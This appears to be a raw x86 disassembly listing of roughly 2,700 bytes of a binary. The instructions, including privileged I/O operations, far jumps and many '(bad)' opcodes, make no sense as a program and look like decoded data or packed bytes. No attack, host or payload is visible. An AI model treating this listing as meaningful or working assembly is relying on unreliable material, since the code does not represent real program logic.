  416af7:	fstp   TBYTE PTR [ebx-0x39c38390]
  416afd:	or     al,0x67
  416aff:	icebp  
  416b00:	outs   dx,BYTE PTR ds:[esi]
  416b01:	scas   al,BYTE PTR es:[edi]
  416b02:	xchg   ebx,eax
  416b03:	xor    edx,eax
  416b05:	fsubr  QWORD PTR [eax+edx*8]
  416b08:	ja     0x416b81
  416b0a:	loop   0x416b34
  416b0c:	ds stc 
  416b0e:	out    dx,eax
  416b0f:	pop    ss
  416b10:	push   ebx
  416b11:	and    al,0x38
  416b13:	or     ebx,DWORD PTR [esp+ebx*2]
  416b16:	mov    ds:0x5e3d9dc8,al
  416b1b:	mov    esp,0xe071aa6c
  416b20:	ret    0x44b5
  416b23:	pushf  
  416b24:	repnz pop ebx
  416b26:	or     al,0x6c
  416b28:	and    esp,DWORD PTR fs:[eax]
  416b2b:	cmp    eax,0xf8a8d3bd
  416b30:	mov    ebx,0x40d95248
  416b35:	int3   
  416b36:	test   BYTE PTR [edi+ebx*8-0x6c9e6a38],0x6f
  416b3e:	or     bl,BYTE PTR [ebx+ebp*8-0x3e]
  416b42:	jmp    0x65ae:0x5bd447b9
  416b49:	dec    DWORD PTR [eax+edi*1+0x67]
  416b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b4e:	ja     0x416b4a
  416b50:	ss nop
  416b52:	mov    fs,eax
  416b54:	mov    esi,0x5ff51158
  416b59:	xchg   esi,eax
  416b5a:	cmp    al,0x99
  416b5c:	add    eax,0xe7e5a0e6
  416b61:	ja     0x416b65
  416b63:	ror    edx,0x1a
  416b66:	jmp    FWORD PTR [ecx-0x61]
  416b69:	adc    al,0x1c
  416b6b:	mov    eax,0xd969336b
  416b70:	push   ds
  416b71:	call   0x4c122fc3
  416b76:	or     ch,bh
  416b78:	iret   
  416b79:	adc    eax,0x67a334a
  416b7e:	push   0xfffffff8
  416b80:	mov    bl,0xa0
  416b82:	int3   
  416b83:	and    DWORD PTR [edx],esp
  416b85:	push   es
  416b86:	ror    DWORD PTR [edi],0x6e
  416b89:	sub    esp,DWORD PTR [ebp+0x20]
  416b8c:	jo     0x416b26
  416b8e:	loop   0x416b65
  416b90:	cwde   
  416b91:	bswap  ecx
  416b93:	add    al,0xe3
  416b95:	into   
  416b96:	lea    ebx,[ebp-0x762027a2]
  416b9c:	ret    0x7d97
  416b9f:	adc    edi,0x8
  416ba2:	repnz dec edi
  416ba4:	add    DWORD PTR [esp+edi*1+0x1a30512f],0x23
  416bac:	pop    es
  416bad:	mov    esi,0x3070cb2f
  416bb2:	outs   dx,DWORD PTR ds:[esi]
  416bb3:	inc    esp
  416bb4:	arpl   WORD PTR [esi+eax*8-0x31],dx
  416bb8:	and    BYTE PTR [edi+0x2b8745c],dl
  416bbe:	(bad)  
  416bbf:	pop    ebp
  416bc0:	ret    0x51a2
  416bc3:	mov    ax,0x94e1
  416bc7:	shl    DWORD PTR [ebx*4+0x7d67cad8],1
  416bce:	adc    ah,BYTE PTR [edx+0x75]
  416bd1:	bound  edx,QWORD PTR [edx-0x21]
  416bd4:	xor    BYTE PTR [esi-0x6],ah
  416bd7:	jle    0x416bc2
  416bd9:	push   es
  416bda:	popa   
  416bdb:	shl    BYTE PTR [ebp+0xb],cl
  416bde:	fnstsw WORD PTR [edi-0x717f1c66]
  416be4:	lods   al,BYTE PTR ds:[esi]
  416be5:	fs enter 0x6bbf,0x2e
  416bea:	sub    BYTE PTR [ebx-0x19],0x0
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xdf5b70a9
  416c63:	mov    ah,0x47
  416c65:	imul   ecx,DWORD PTR [ecx-0xb],0xff0000
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	jmp    0x71e43754
  416c73:	out    0x4d,eax
  416c75:	mov    ch,0xe8
  416c77:	repz adc al,0x10
  416c7a:	push   cs
  416c7b:	sbb    BYTE PTR [ecx+esi*4-0x22],bh
  416c7f:	pushf  
  416c80:	cld    
  416c81:	xchg   ebx,eax
  416c82:	jg     0x416c5e
  416c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c85:	mov    al,ds:0x35563aa2
  416c8a:	das    
  416c8b:	add    al,0xff
  416c8d:	xchg   esp,eax
  416c8e:	jo     0x416cfb
  416c90:	pop    edi
  416c91:	push   ds
  416c92:	jecxz  0x416cb3
  416c94:	mov    eax,0x8cc74959
  416c99:	retf   0xddbb
  416c9c:	cmc    
  416c9d:	fldenv cs:[edi]
  416ca0:	pop    edi
  416ca1:	ret    
  416ca2:	jbe    0x416d1b
  416ca4:	jnp    0x416cc2
  416ca6:	or     BYTE PTR [esi+0x4a],dl
  416ca9:	mov    eax,ds:0xe7d9c181
  416cae:	nop
  416caf:	pop    edx
  416cb0:	dec    esp
  416cb1:	or     DWORD PTR [ecx-0x7c],eax
  416cb4:	bound  eax,QWORD PTR [esi]
  416cb6:	jge    0x416ce0
  416cb8:	jge    0x416c46
  416cba:	jge    0x416cb5
  416cbc:	pop    edx
  416cbd:	cmp    ch,bh
  416cbf:	cmc    
  416cc0:	in     al,dx
  416cc1:	retf   
  416cc2:	add    edi,edi
  416cc4:	cli    
  416cc5:	pusha  
  416cc6:	ret    0x1e18
  416cc9:	ds jbe 0x416d11
  416ccc:	(bad)  
  416ccd:	xlat   BYTE PTR ds:[ebx]
  416cce:	aad    0xfb
  416cd0:	and    BYTE PTR [ecx-0x24],ch
  416cd3:	out    dx,eax
  416cd4:	idiv   bh
  416cd6:	outs   dx,DWORD PTR ds:[esi]
  416cd7:	adc    al,BYTE PTR [ebx+0x79]
  416cda:	inc    DWORD PTR [ebx-0x6ab38676]
  416ce0:	mov    ss:0xb732f772,eax
  416ce6:	in     eax,dx
  416ce7:	jnp    0x416c89
  416ce9:	inc    esp
  416cea:	mov    ecx,0x838228c6
  416cef:	ss icebp 
  416cf1:	daa    
  416cf2:	adc    ch,BYTE PTR ds:0x984322bd
  416cf8:	sub    eax,0xc02cbb3c
  416cfd:	call   0x3fe1:0x1d2c
  416d03:	mov    edx,0xe2dbadd1
  416d08:	push   ss
  416d09:	sub    edi,DWORD PTR [edx-0x28]
  416d0c:	std    
  416d0d:	cmp    eax,0xbd71fce2
  416d12:	cmp    al,0x20
  416d14:	xor    DWORD PTR [ebx-0x34],0xcb306409
  416d1b:	pop    ss
  416d1c:	int    0x37
  416d1e:	xchg   ebx,eax
  416d1f:	adc    eax,esp
  416d21:	jne    0x416d83
  416d23:	sbb    eax,0xf3fe032e
  416d28:	jecxz  0x416d13
  416d2a:	sbb    dh,dl
  416d2c:	cmp    dl,BYTE PTR [eax+0x66]
  416d2f:	js     0x416ccc
  416d31:	jmp    0x416ccf
  416d33:	mov    ch,dh
  416d35:	dec    eax
  416d36:	hlt    
  416d37:	ins    DWORD PTR es:[di],dx
  416d39:	pop    ebx
  416d3a:	mov    bh,0x17
  416d3c:	push   ds
  416d3d:	stos   BYTE PTR es:[edi],al
  416d3e:	jge    0x416d16
  416d40:	inc    edi
  416d41:	std    
  416d42:	mov    dl,0x8c
  416d44:	mov    eax,0x167d7d55
  416d49:	and    dl,BYTE PTR [esi]
  416d4b:	mov    bl,BYTE PTR ds:0x222790ad
  416d51:	mov    edi,0x7c49d66d
  416d56:	adc    DWORD PTR [ecx+0x58a4d66],esp
  416d5c:	pushf  
  416d5d:	jge    0x416d58
  416d5f:	retf   
  416d60:	ffreep st(1)
  416d62:	ja     0x416d72
  416d64:	mov    ah,0x3
  416d66:	int3   
  416d67:	fwait
  416d68:	inc    ebx
  416d69:	cdq    
  416d6a:	arpl   ax,di
  416d6c:	enter  0x0,0x0
	...
  416dd4:	add    BYTE PTR [eax],al
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	mov    eax,ds:0x484de162
  416de7:	test   BYTE PTR [eax],0x0
  416dea:	inc    DWORD PTR [eax]
  416dec:	add    BYTE PTR [eax],al
  416dee:	xchg   esp,eax
  416def:	sbb    DWORD PTR [edi-0x17061e86],edi
  416df5:	add    al,bh
  416df7:	xchg   BYTE PTR [eax+0x484614eb],ch
  416dfd:	(bad)  
  416dff:	out    0xed,eax
  416e01:	std    
  416e02:	test   DWORD PTR ds:0x88b1c6e8,0xd7847fff
  416e0c:	(bad)  
  416e0e:	sub    BYTE PTR [ecx],ch
  416e10:	loope  0x416e31
  416e12:	mov    ah,0x6a
  416e14:	dec    esp
  416e15:	xor    eax,0x885783e
  416e1a:	cwde   
  416e1b:	loope  0x416e9b
  416e1d:	or     ebp,DWORD PTR [eax+0x39]
  416e20:	iret   
  416e21:	ficomp DWORD PTR [edi-0x4]
  416e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e25:	repnz hlt 
  416e27:	mov    bh,0xf0
  416e29:	and    DWORD PTR [edx+0x45],edx
  416e2c:	jo     0x416dd4
  416e2e:	call   0x605e50b7
  416e33:	push   ebp
  416e34:	std    
  416e35:	jne    0x416e0f
  416e37:	cmp    BYTE PTR [ecx-0x29],ch
  416e3a:	ret    0x2d9c
  416e3d:	ficomp DWORD PTR [ebx+edx*8+0x3f]
  416e41:	scas   eax,DWORD PTR es:[edi]
  416e42:	test   DWORD PTR [esi-0x6be16f01],ebx
  416e48:	mov    al,0xca
  416e4a:	daa    
  416e4b:	pop    ecx
  416e4c:	scas   eax,DWORD PTR es:[edi]
  416e4d:	in     al,0xdf
  416e4f:	cld    
  416e50:	mov    ebp,0xf7c82228
  416e55:	(bad)  
  416e57:	lock das 
  416e59:	adc    al,0xbd
  416e5b:	inc    ebp
  416e5c:	xchg   esi,eax
  416e5d:	sub    dh,BYTE PTR [esp+esi*2+0x28f34f59]
  416e64:	aas    
  416e65:	leave  
  416e66:	push   es
  416e67:	mov    al,0xd6
  416e69:	callw  0x2eb8
  416e6d:	mov    dl,0x2d
  416e6f:	iret   
  416e70:	shl    BYTE PTR [eax+0x16],0x34
  416e74:	push   cs
  416e75:	xchg   edx,eax
  416e76:	jecxz  0x416e80
  416e78:	cmp    bh,BYTE PTR [ecx+edi*2-0x1]
  416e7c:	mov    esi,DWORD PTR [ebx+edx*4]
  416e7f:	jg     0x416ee1
  416e81:	ret    
  416e82:	cmpxchg BYTE PTR [ebp+eiz*2+0x473d13ec],dh
  416e8a:	(bad)
  416e8e:	loop   0x416e18
  416e90:	mov    bl,0x84
  416e92:	outs   dx,BYTE PTR ds:[esi]
  416e93:	test   BYTE PTR [edi],ch
  416e95:	test   DWORD PTR [ebx],esi
  416e97:	adc    BYTE PTR [edx+0x5d],ah
  416e9a:	pop    esi
  416e9b:	sub    esi,ebp
  416e9d:	and    DWORD PTR [ebp-0x1c278c98],ebx
  416ea3:	scas   eax,DWORD PTR es:[edi]
  416ea4:	(bad)  
  416ea6:	fld    DWORD PTR [edx+ecx*2]
  416ea9:	cmpps  xmm5,XMMWORD PTR [eax+0x6dad2699],0xc3
  416eb1:	aas    
  416eb2:	pop    ss
  416eb3:	pop    eax
  416eb4:	popa   
  416eb5:	xor    dh,ah
  416eb7:	cwde   
  416eb8:	or     al,ch
  416eba:	mov    bl,cl
  416ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ebd:	enter  0xd09e,0x70
  416ec1:	cwde   
  416ec2:	jl     0x416eae
  416ec4:	inc    ecx
  416ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ec6:	inc    esp
  416ec7:	sbb    bh,BYTE PTR [ebx+ebp*8+0x17]
  416ecb:	fstp   DWORD PTR [edx]
  416ecd:	stc    
  416ece:	fisubr WORD PTR [ebp-0x5e]
  416ed1:	push   0xffffffc2
  416ed3:	outs   dx,DWORD PTR ds:[esi]
  416ed4:	into   
  416ed5:	in     eax,0x1b
  416ed7:	xor    bl,BYTE PTR [edx+0x60bbda31]
  416edd:	or     eax,0x9656fbf
  416ee2:	jg     0x416f5b
  416ee4:	sub    DWORD PTR [ebx],ebp
  416ee6:	jo     0x416e93
  416ee8:	inc    ebp
  416ee9:	pop    ds
  416eea:	test   bx,cx
	...
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x548e8eea
  416f64:	sub    al,0xca
  416f66:	inc    edi
  416f67:	test   DWORD PTR [eax],0xff00
  416f6d:	add    BYTE PTR [ebp-0x39d622f],ah
  416f73:	or     DWORD PTR [esi],ebx
  416f75:	les    ebx,FWORD PTR [ebx]
  416f77:	mov    dl,0x9d
  416f79:	pop    ebp
  416f7a:	repz xchg ecx,eax
  416f7c:	pushf  
  416f7d:	out    0xd6,eax
  416f7f:	cmc    
  416f80:	cmp    ebx,eax
  416f82:	test   al,0x0
  416f84:	jae    0x416f88
  416f86:	sbb    dl,BYTE PTR [edx]
  416f88:	push   esp
  416f89:	push   ebx
  416f8a:	jle    0x416f77
  416f8c:	dec    ebp
  416f8d:	jge    0x416f71
  416f8f:	popaw  
  416f91:	jle    0x416f2c
  416f93:	mov    ds:0x7a906796,eax
  416f98:	(bad)  
  416f99:	iret   
  416f9a:	sub    BYTE PTR [ecx-0x2a],al
  416f9d:	mov    dh,0x64
  416f9f:	outs   dx,BYTE PTR ds:[esi]
  416fa0:	jl     0x416fd0
  416fa2:	pop    ds
  416fa3:	xchg   edi,eax
  416fa4:	pop    esi
  416fa5:	stos   WORD PTR es:[edi],ax
  416fa7:	rcr    BYTE PTR [ecx+eax*8-0x3e],1
  416fab:	out    0x85,eax
  416fad:	dec    ebp
  416fae:	scas   al,BYTE PTR es:[edi]
  416faf:	mov    edx,0x93a1d4da
  416fb4:	push   es
  416fb5:	mov    esi,0x165fb95
  416fba:	pop    esi
  416fbb:	(bad)  
  416fbc:	(bad)  
  416fbd:	repnz pop ss
  416fbf:	ins    BYTE PTR es:[edi],dx
  416fc0:	fbld   TBYTE PTR [ecx+0x8]
  416fc3:	inc    ecx
  416fc4:	add    ebx,eax
  416fc6:	(bad)  
  416fc7:	repnz int 0xbc
  416fca:	lods   eax,DWORD PTR ds:[esi]
  416fcb:	or     eax,0x6e41736f
  416fd1:	push   esi
  416fd2:	push   ebx
  416fd3:	jno    0x416fed
  416fd5:	in     eax,0xf1
  416fd7:	mov    ebx,0x2a3eda3b
  416fdc:	xor    BYTE PTR [ebx+0x52],ah
  416fdf:	ja     0x417018
  416fe1:	add    bh,dh
  416fe3:	ds addr16 and al,bl
  416fe7:	xor    al,0x5c
  416fe9:	cs xchg ebp,eax
  416feb:	adc    bl,BYTE PTR [ecx-0x7b01823]
  416ff1:	and    eax,0xf7e80c29
  416ff6:	and    al,0xa3
  416ff8:	add    BYTE PTR [ebp+0xc],ch
  416ffb:	mov    edx,DWORD PTR ds:0xa613c4b6
  417001:	xor    edx,eax
  417003:	or     al,0x22
  417005:	sub    BYTE PTR [ecx+edx*2+0x2224ceb8],dh
  41700c:	mov    al,ds:0x8f9bd56c
  417011:	mov    dl,0x1b
  417013:	pop    esp
  417014:	mov    bl,BYTE PTR [ecx+0xd63cf19]
  41701a:	js     0x416fe6
  41701c:	pop    esp
  41701d:	loopne 0x416ffb
  41701f:	xor    edi,ebx
  417021:	lods   eax,DWORD PTR ds:[esi]
  417022:	jns    0x416ffc
  417024:	add    ah,BYTE PTR [ecx+0x216949ca]
  41702a:	mov    al,0xd6
  41702c:	sub    DWORD PTR [eax],edi
  41702e:	in     eax,0x89
  417030:	jecxz  0x416fc0
  417032:	scas   eax,DWORD PTR es:[edi]
  417033:	mov    ds:0xe00e6c8d,al
  417038:	arpl   WORD PTR [edi],bp
  41703a:	fild   DWORD PTR [ebp+0x5aeceb5c]
  417040:	call   0x3419582
  417045:	push   ebx
  417046:	cmp    BYTE PTR [edx],dl
  417048:	in     al,dx
  417049:	dec    edi
  41704a:	(bad)  
  41704b:	jg     0x416fd2
  41704d:	mov    esi,DWORD PTR [edi+0x69]
  417050:	in     al,0x75
  417052:	pop    eax
  417053:	test   BYTE PTR [ecx],bl
  417055:	ins    BYTE PTR es:[edi],dx
  417056:	ror    BYTE PTR [esi],cl
  417058:	mov    esi,0x752ff096
  41705d:	clc    
  41705e:	shl    DWORD PTR [ebp+0x70],1
  417061:	dec    edx
  417062:	in     al,0x4
  417064:	cmp    dl,BYTE PTR ss:[edi-0x3ceb0e52]
  41706b:	shl    BYTE PTR [esi+0x0],cl
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    eax,DWORD PTR [edi+0x468a25c2]
  4170e7:	clc    
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	inc    DWORD PTR [eax]
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	in     al,dx
  4170ef:	xchg   esp,eax
  4170f1:	sahf   
  4170f2:	ss jnp 0x417136
  4170f5:	ret    0xc1a9
  4170f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170fa:	xlat   BYTE PTR ds:[ebx]
  4170fb:	mov    al,ds:0xea879090
  417100:	inc    edi
  417101:	leave  
  417102:	popf   
  417103:	aad    0x9b
  417105:	call   0x12b8:0xae873da3
  41710c:	adc    al,0xbd
  41710e:	push   ss
  41710f:	xchg   esi,eax
  417110:	mov    edi,0x986fd142
  417115:	jge    0x41713c
  417117:	scas   eax,DWORD PTR es:[edi]
  417118:	mov    ds:0x8fd4a9cd,eax
  41711d:	inc    edi
  41711e:	add    BYTE PTR [ebx+0x56],ah
  417121:	cmp    DWORD PTR [edx+0x7],ecx
  417124:	outs   dx,BYTE PTR ds:[esi]
  417125:	imul   ebp,DWORD PTR [edx+0x71eeb2d3],0x9880df50
  41712f:	scas   al,BYTE PTR es:[edi]
  417130:	sub    al,0xf4
  417132:	cmc    
  417133:	ss cwde 
  417135:	mov    ds:0xc5eb920c,eax
  41713a:	out    0x39,al
  41713c:	or     DWORD PTR [esi+0x290e9ab4],eax
  417142:	dec    ebx
  417143:	dec    ebp
  417144:	dec    ecx
  417145:	dec    ebx
  417146:	(bad)  
  417147:	dec    ebx
  417148:	vpmacssww xmm9,xmm6,xmm4,XMMWORD PTR [eax-0x66]
  41714f:	jo     0x4171c3
  417151:	loope  0x417199
  417153:	or     eax,0x88554ff7
  417158:	add    al,0xae
  41715a:	aad    0xfe
  41715c:	test   eax,0x401a1a32
  417161:	jp     0x4170ee
  417163:	push   esp
  417164:	leave  
  417165:	lds    ecx,FWORD PTR [edx+0xb731146]
  41716b:	xchg   edx,eax
  41716c:	(bad)  
  41716d:	aaa    
  41716e:	mov    dl,0xe3
  417170:	in     eax,0x30
  417172:	adc    esi,edx
  417174:	dec    ecx
  417175:	mov    eax,DWORD PTR [edx]
  417177:	cmp    al,0x4b
  417179:	ror    DWORD PTR [esi],cl
  41717b:	xor    esi,DWORD PTR [ebx]
  41717d:	push   ebx
  41717e:	in     al,0x32
  417180:	cmp    ebx,esi
  417182:	jne    0x417181
  417184:	push   ds
  417185:	fs ret 0x165e
  417189:	push   esi
  41718a:	nop
  41718b:	add    eax,0x301637c8
  417190:	or     esp,DWORD PTR [edi]
  417192:	or     al,BYTE PTR ds:0xb2b6ecec
  417198:	(bad)  [esi+0x29]
  41719b:	add    BYTE PTR [edi],dl
  41719d:	shr    DWORD PTR [ebx+0x64],1
  4171a0:	sub    ebx,DWORD PTR [edx-0x487d6bf0]
  4171a6:	xor    BYTE PTR [eax+edx*2-0x33661ba6],dh
  4171ad:	sub    DWORD PTR [eax+eiz*1],esi
  4171b0:	sbb    DWORD PTR ds:0xaf7584d5,ebp
  4171b6:	ja     0x417208
  4171b8:	inc    edx
  4171b9:	fidiv  DWORD PTR [bx-0x45]
  4171bd:	sti    
  4171be:	push   ss
  4171bf:	pop    ebx
  4171c0:	xor    al,0x82
  4171c2:	std    
  4171c3:	and    al,0x2
  4171c5:	mov    bh,0x80
  4171c7:	pop    ebp
  4171c8:	xchg   esp,eax
  4171c9:	imul   ebx,DWORD PTR [edi+eiz*1+0x4a112ef4],0xe821def4
  4171d4:	fcomp  QWORD PTR [esi-0x21df9ed0]
  4171da:	jl     0x417210
  4171dc:	imul   ebx,DWORD PTR [edi-0x4155d851],0xd761a02d
  4171e6:	fs mov WORD PTR fs:[eax-0x7c],?
  4171eb:	loop   0x41721f
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	test   al,0x34
  417264:	mov    bl,0xfc
  417266:	inc    ebp
  417267:	stc    
  417268:	add    BYTE PTR [eax],al
  41726a:	inc    DWORD PTR [eax]
  41726c:	add    BYTE PTR [eax],al
  41726e:	pop    esi
  41726f:	iret   
  417270:	inc    esp
  417271:	push   ds
  417272:	mov    ds:0xb1f0dd25,al
  417277:	fst    QWORD PTR [edx+0x58]
  41727a:	and    DWORD PTR [ecx-0x2c],ebp
  41727d:	and    edx,ebx
  41727f:	out    0x1d,al
  417281:	scas   eax,DWORD PTR es:[edi]
  417282:	les    ecx,FWORD PTR [edx+0x69557b54]
  417288:	sub    al,ah
  41728a:	imul   esi,DWORD PTR gs:[ebp+0x4ab3e258],0xfdabd204
  417295:	les    ebx,FWORD PTR fs:[esi+eax*8]
  417299:	jne    0x4172e2
  41729b:	adc    DWORD PTR [ebx],0x4407471d
  4172a1:	cld    
  4172a2:	add    BYTE PTR [edi+0x75],cl
  4172a5:	mov    eax,ds:0x64553822
  4172aa:	ins    DWORD PTR es:[edi],dx
  4172ab:	or     BYTE PTR [edi],al
  4172ad:	cmp    dh,BYTE PTR [eax]
  4172af:	pop    esi
  4172b0:	sti    
  4172b1:	xor    dl,BYTE PTR [esi+0x15]
  4172b4:	pop    esi
  4172b5:	enter  0x374b,0xdf
  4172b9:	push   ebp
  4172ba:	dec    esp
  4172bb:	in     eax,dx
  4172bc:	cmc    
  4172bd:	sub    esi,DWORD PTR [esi]
  4172bf:	sub    dh,dh
  4172c1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172c3:	ret    
  4172c4:	or     DWORD PTR [esi],esp
  4172c6:	jno    0x417256
  4172c8:	test   eax,0x3c6871d
  4172cd:	pusha  
  4172ce:	mov    bl,0x56
  4172d0:	xor    eax,0xd6109429
  4172d5:	ja     0x4172ce
  4172d7:	push   ebp
  4172d8:	sti    
  4172d9:	jne    0x4172d8
  4172db:	nop
  4172dc:	xchg   DWORD PTR [esi+edi*4-0x16613c95],esi
  4172e3:	fild   DWORD PTR [ecx]
  4172e5:	(bad)  ds:0xaafbc9a3
  4172eb:	mov    edi,DWORD PTR ds:0x889aa48f
  4172f1:	lock add al,0xed
  4172f4:	mov    ch,0x45
  4172f6:	sbb    eax,0x1785d77c
  4172fb:	mov    dh,0xf8
  4172fd:	adc    DWORD PTR [ecx+0x35811494],eax
  417303:	leave  
  417304:	dec    ecx
  417305:	int    0xb7
  417307:	sti    
  417308:	js     0x41728f
  41730a:	xchg   edi,eax
  41730b:	pop    ecx
  41730c:	dec    bl
  41730e:	mov    ch,0x76
  417310:	push   edi
  417311:	rcr    BYTE PTR [ebx-0x9],0xff
  417315:	add    al,0xe3
  417317:	pop    ebp
  417318:	in     al,dx
  417319:	xchg   ecx,eax
  41731a:	data16 or BYTE PTR [edi-0x1a66e436],ah
  417321:	xchg   ebp,eax
  417322:	push   ecx
  417323:	into   
  417324:	loopne 0x4172dc
  417326:	xchg   DWORD PTR [eax],esp
  417328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417329:	mov    esp,0xe6e9b57f
  41732e:	xlat   BYTE PTR ds:[ebx]
  41732f:	or     eax,0xca3e107c
  417334:	pop    edx
  417335:	sbb    BYTE PTR [edi+0x12],0xf1
  417339:	dec    DWORD PTR [esi]
  41733b:	mov    edx,DWORD PTR [ebx+0x1ef1920a]
  417341:	adc    ch,bl
  417343:	sbb    DWORD PTR [ecx],edi
  417345:	(bad)  
  417346:	cmc    
  417347:	dec    esp
  417348:	scas   al,BYTE PTR es:[edi]
  417349:	mov    DWORD PTR [ecx+0x7453d22c],esp
  41734f:	fdiv   QWORD PTR [ecx]
  417351:	mov    edi,0x2d574227
  417356:	inc    ebx
  417357:	retf   
  417358:	lods   eax,DWORD PTR ds:[esi]
  417359:	bound  esp,QWORD PTR [eax+0x60]
  41735c:	and    BYTE PTR [edi+0x35540ae1],ah
  417362:	inc    esp
  417363:	push   ebx
  417364:	sbb    ebx,0x9c8f0ee5
  41736a:	int    0xb6
  41736c:	adc    al,0x0
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs xchg ebx,eax
  4173e3:	sub    cl,bl
  4173e5:	mov    DWORD PTR [edx+edi*8+0x0],eax
  4173e9:	add    bh,bh
  4173eb:	add    BYTE PTR [eax],al
  4173ed:	add    BYTE PTR [esi+eax*4-0x1e],ch
  4173f1:	adc    ch,BYTE PTR [esp+ebp*1]
  4173f4:	rcr    cl,0xc4
  4173f7:	ins    BYTE PTR es:[edi],dx
  4173f8:	push   0xea14330a
  4173fd:	dec    ebx
  4173fe:	outs   dx,DWORD PTR ds:[esi]
  4173ff:	leave  
  417400:	stc    
  417401:	mov    dh,0xc3
  417403:	pop    eax
  417404:	pop    ss
  417405:	jecxz  0x41741c
  417407:	shr    BYTE PTR [edi+0x7a],0x11
  41740b:	xchg   DWORD PTR gs:[edi],esp
  41740e:	xor    esp,eax
  417410:	and    al,0x62
  417412:	pusha  
  417413:	loop   0x417460
  417415:	gs aas 
  417417:	sbb    eax,0xb1fd3105
  41741c:	cwde   
  41741d:	cmp    al,BYTE PTR [eax+0x5]
  417420:	popa   
  417421:	fwait
  417422:	test   eax,0x944cb5a5
  417427:	outs   dx,DWORD PTR es:[esi]
  417429:	aaa    
  41742a:	sub    BYTE PTR [edx-0x52],ch
  41742d:	mov    eax,0x9292e83
  417432:	daa    
  417433:	jns    0x417475
  417435:	test   al,0x9a
  417437:	xchg   DWORD PTR [eax-0xdc8c086],esp
  41743d:	out    0x48,eax
  41743f:	jnp    0x41748d
  417441:	mov    bl,0x94
  417443:	mov    ch,0x95
  417445:	add    eax,0x8fd91332
  41744a:	not    ch
  41744c:	add    BYTE PTR [esi+0x49],bl
  41744f:	xlat   BYTE PTR ds:[ebx]
  417450:	or     DWORD PTR [ebx],0x35
  417453:	cmp    al,0xb4
  417455:	add    edi,esi
  417457:	jmp    0x608b:0x9b9a67e0
  41745e:	aaa    
  41745f:	sbb    al,0xc2
  417461:	mov    ch,0x6e
  417463:	fimul  WORD PTR [edx]
  417465:	sub    edi,ecx
  417467:	mov    esp,0xb7922b96
  41746c:	jmp    0x9d3767c7
  417471:	cmp    ecx,DWORD PTR [ecx+0x1b037dc0]
  417477:	imul   esi,DWORD PTR [esi-0x77815b6],0x58ff0c97
  417481:	pop    ebp
  417482:	dec    ecx
  417483:	fist   DWORD PTR ss:[esp+eax*1]
  417487:	fistp  WORD PTR [ebx+0x3398a7d7]
  41748d:	fst    DWORD PTR [esi+0x74]
  417490:	xchg   DWORD PTR [edi-0x5da7a965],esp
  417496:	lds    esi,FWORD PTR [edx-0x7b8caef3]
  41749c:	add    ebx,0xaecad3b7
  4174a2:	ins    DWORD PTR es:[edi],dx
  4174a3:	test   ah,bh
  4174a5:	rcl    BYTE PTR [ebx],0x2a
  4174a8:	fistp  DWORD PTR [ebx-0x2b21e25]
  4174ae:	mov    cl,0x84
  4174b0:	xor    DWORD PTR [ecx-0x5e],eax
  4174b3:	push   edi
  4174b4:	and    DWORD PTR [ebx+0x543429e6],0x46
  4174bb:	push   ebx
  4174bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bd:	lods   eax,DWORD PTR ds:[esi]
  4174be:	daa    
  4174bf:	jle    0x4174ad
  4174c1:	xor    ah,BYTE PTR [ecx]
  4174c3:	cs push ecx
  4174c5:	mov    WORD PTR [ecx+0x3b],es
  4174c8:	adc    BYTE PTR [edx+0x5e],0x7a
  4174cc:	sbb    ecx,DWORD PTR [edx+0x42578793]
  4174d2:	cmp    dl,BYTE PTR [ecx-0x13]
  4174d5:	add    edi,edi
  4174d7:	or     ch,BYTE PTR [ebp-0x7a]
  4174da:	jecxz  0x417545
  4174dc:	or     al,0x49
  4174de:	xor    eax,ebx
  4174e0:	sub    eax,DWORD PTR [ebx+edi*8-0x6f208071]
  4174e7:	(bad)  
  4174e8:	retf   
  4174e9:	into   
  4174ea:	cwde   
  4174eb:	(bad)  
  4174ec:	cli    
	...
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	scas   al,BYTE PTR es:[edi]
  417563:	leave  
  417564:	retf   0x43e2
  417567:	sti    
  417568:	add    BYTE PTR [eax],al
  41756a:	inc    DWORD PTR [eax]
  41756c:	add    BYTE PTR [eax],al
  41756e:	data16 mov al,0x4e
  417571:	add    DWORD PTR [ebx+0x25],edx
  417574:	inc    BYTE PTR [eax]
  417576:	rcl    al,0x8c
  417579:	lahf   
  41757a:	mov    WORD PTR [esi+0x51],fs
  41757d:	fld    DWORD PTR [eax+0x72128dd4]
  417583:	loop   0x4175c9
  417585:	mov    ebp,0x731bc39c
  41758a:	call   0x1448306e
  41758f:	loope  0x41754b
  417591:	dec    edi
  417592:	xchg   ecx,eax
  417593:	shr    BYTE PTR [eax-0x74],cl
  417596:	iret   
  417597:	push   cs
